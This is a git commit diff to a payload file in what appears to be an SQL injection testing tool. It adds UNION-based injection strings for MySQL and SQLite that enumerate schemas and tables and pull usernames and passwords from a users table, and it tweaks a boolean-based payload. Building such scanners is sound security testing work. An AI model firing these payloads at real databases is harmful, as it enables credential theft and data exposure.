3d58abfc93b69045d73c8ede53404f821bf2a732
flomero <49640251+flomero@users.noreply.github.com>
2024-11-24 14:27:04 +0100

    check other payloads

--- vaccine/testpayloads.py
+++ vaccine/testpayloads.py
@@ -58,11 +58,24 @@ test_injections = {
 		"1 UNION SELECT NULL, table_name, column_name FROM information_schema.columns -- ",
 		"1 UNION SELECT id, username, password FROM users -- ",
 		"1 UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- ", # MySQL specific
+		"1 'UNION SELECT NULL --'",
+		"1 'UNION SELECT NULL, NULL --'",
+		"1 'UNION SELECT NULL, NULL, NULL --'",
+		"1 'UNION SELECT NULL, database(), version() --'",  # MySQL specific
+		"1 'UNION SELECT NULL, sqlite_version(), NULL --'",  # SQLite specific
+		"1 'UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- '", # MySQL specific
+		"1 'UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- '", # SQLite specific
+		"1 'UNION SELECT NULL, CONCAT(table_name, ':', column_name), NULL FROM information_schema.columns WHERE table_schema=database() -- '", # MySQL specific
+		"1 'UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- '", # SQLite specific
+		"1 'UNION SELECT NULL, table_name, column_name FROM information_schema.columns -- '",
+		"1 'UNION SELECT id, username, password FROM users -- '",
+		"1 'UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- '", # MySQL specific
+		"1 'UNION SELECT NULL, NULL, NULL FROM information_schema.schemata -- '", # MySQL specific
 	],
 	"boolean": [
 		"'OR' 1=1",
 		"OR 1=1 --",  
-		"' OR '1'='1' --",  
+		"' OR '1'='1' --'",  
 		"\" OR \"1\"=\"1\" --",  
 		"1 OR 1=1#",
 		"' OR ' a'='a",
